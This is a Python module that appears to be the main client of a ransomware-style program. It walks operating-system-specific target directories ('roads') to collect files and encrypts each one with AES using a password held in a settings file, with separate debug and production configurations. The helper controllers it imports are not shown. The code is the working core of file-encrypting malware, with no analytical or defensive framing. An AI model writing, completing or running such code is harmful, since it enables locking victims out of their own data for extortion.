import logging
import os
import settings
from utils.date_utils import format_date, now
from utils.os_utils import get_operating_system_id, get_operating_system_name
from controllers.files_controller import FilesController
from controllers.aes_encryption_controller import AESEncryptionController

logging.basicConfig(
    format=settings.LOG_PATTERN,
    level=logging.INFO
)


def encrypt_target_files(targets):
    controller = AESEncryptionController()
    encrypt_files = []
    for target in targets:
        encrypt_files.append(controller.encrypt_file(target, settings.PASSWORD_AES_ENCRYPTION))
    logging.info(f"result encrypt_files => {encrypt_files}")
    return encrypt_files


def detect_target_files(paths):
    amount_of_roads = len(paths)
    if not paths:
        logging.warning(f"The road list is empty. You must specify at least one road")
        return
    logging.info(f"Checking the {amount_of_roads} roads ...")
    targets = []
    controller = FilesController()
    for path_ in paths:
        logging.info(f"checking the road => {path_}")
        result = controller.get_list_targets_from_the_road(path_)
        targets += result
    return targets


def run(debug=True):
    road_paths = []
    if debug:
        logging.warning(f"OS client at: 'DEBUG'")
        road_paths = settings.CONF_DEBUG.get('roads', [])
    else:
        os_id = get_operating_system_id()
        logging.info(f"OS client at: {get_operating_system_name(os_id)}")
        road_paths = settings.CONF_PRODUCTION.get(os_id, {}).get('roads', [])
    targets = detect_target_files(road_paths)
    encrypted_targets = encrypt_target_files(targets)


def run_client():
    logging.info(f"Starting client at: ({format_date(now())})")
    run(debug=True)
    logging.info(f"Stopped client at: ({format_date(now())})")
